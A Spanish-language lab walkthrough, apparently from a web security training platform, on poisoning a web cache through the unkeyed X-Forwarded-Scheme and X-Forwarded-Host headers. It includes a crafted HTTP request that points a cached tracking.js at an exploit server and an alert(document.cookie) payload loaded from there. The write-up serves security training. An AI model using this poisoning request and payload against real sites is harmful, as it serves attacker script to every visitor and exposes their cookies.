---
title: "3 - Web cache poisoning with multiple headers"
---

# 3 - Web cache poisoning with multiple headers

[Lab: Web cache poisoning with multiple headers](https://www.youtube.com/watch?v=YA1Jhd8op4g&ab_channel=JarnoTimmermans)

Se ha testeado y se ha encontrado que la cabecera  X-Forwarded-Scheme es un unkeyed input.
### ¿Para qué sirve `X-Forwarded-Scheme`?

Cuando un servidor intermedio como un proxy o un balanceador de carga está involucrado en una conexión, podría modificar el esquema de la solicitud por razones de seguridad o eficiencia. Por ejemplo:
- Un cliente puede hacer una solicitud HTTPS a un proxy que luego convierte esa solicitud a HTTP antes de reenviarla al servidor final.
- El encabezado `X-Forwarded-Scheme` permite que el servidor final sepa si la solicitud original fue HTTPS o HTTP, incluso si el proxy ha cambiado el esquema.

Este encabezado puede ser útil para:
- **Aplicar configuraciones de seguridad**: Permitir que el servidor responda con seguridad según el esquema original.
- **Redireccionar o modificar respuestas**: Si un servidor necesita forzar HTTPS, puede leer `X-Forwarded-Scheme` para decidir si debe redirigir al cliente a HTTPS.
  
### Ejemplo de una solicitud con `X-Forwarded-Scheme`

```http
GET /recurso HTTP/1.1
Host: ejemplo.com
X-Forwarded-Scheme: https
```

Aquí, el encabezado `X-Forwarded-Scheme: https` indica que la solicitud original fue HTTPS, aunque podría haber sido transformada a HTTP por un proxy antes de llegar al servidor final.

### Uso en ataques de envenenamiento de caché

El encabezado `X-Forwarded-Scheme` también puede ser una entrada sin clave (unkeyed input) en un servidor, lo que significa que su valor podría no influir en la decisión de la caché. Esto puede explotarse en un ataque de envenenamiento de caché si el servidor utiliza el valor de este encabezado para generar la respuesta, pero la caché lo ignora. 

1. **Manipulación de `X-Forwarded-Scheme`**: Si puedes enviar solicitudes con diferentes valores de `X-Forwarded-Scheme` (por ejemplo, cambiando entre `http` y `https`), el servidor podría generar respuestas ligeramente diferentes. ==Sin embargo, si la caché no incluye `X-Forwarded-Scheme` en la clave de caché==, puede almacenar una respuesta "envenenada".
   
2. **Inyección de contenido malicioso**: Si el valor de `X-Forwarded-Scheme` cambia cómo el servidor genera los enlaces o redirecciones (por ejemplo, generando URLs que comiencen con `http` o `https`), podrías manipular el esquema para forzar la generación de contenido no deseado o inseguro en la respuesta en caché.

3. **Resultado**: La respuesta manipulada se guarda en caché, de modo que las solicitudes posteriores que coincidan con la clave de caché reciben una respuesta que podría contener URLs inseguras o contenido envenenado.

Este tipo de ataque funciona especialmente bien en servidores que confían en los encabezados `X-Forwarded` sin validarlos adecuadamente o que no incluyen esos encabezados en la clave de caché.


1. Si cambias a `X-Forwarded-Scheme: http` y pones un Caché Buster, te va redirigir a la url pero con https, si lo vuelves a cambiar a https no te redirige, la cosa es que detecta si estás usando https para , en el caso contrario, redirigirte.
2. Volvemos a guess headers y encontramos `X-Forwarded-Host` que también es otro unkeyed input y que si queda reflejado en el output.
3. Podemos usarlo para redirigir a una página maliciosa, en concreto podemos aprovecharnos de `/resources/images/tracker.gif` :

```request
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 21
X-Cache: hit
Content-Length: 70

document.write('<img src="/resources/images/tracker.gif?page=post">');
```

Podemos cargar en `https://exploit-0a4e004c04dd8c28815524050189000a.exploit-server.net/resources/images/tracker.gif` : alert(document.cookie);

```request
GET /resources/js/tracking.js HTTP/2
Host: 0abb001904808c8381d325fe0080003e.web-security-academy.net
Sec-Ch-Ua: "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
X-Forwarded-Scheme: http
X-Forwarded-Host: exploit-0a4e004c04dd8c28815524050189000a.exploit-server.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0abb001904808c8381d325fe0080003e.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=0, i
```

Entonces cuando se cargue / se cargará el script del recurso `https://exploit-0a4e004c04dd8c28815524050189000a.exploit-server.net/resources/js/tracking.js` y se ejecutará la alerta.
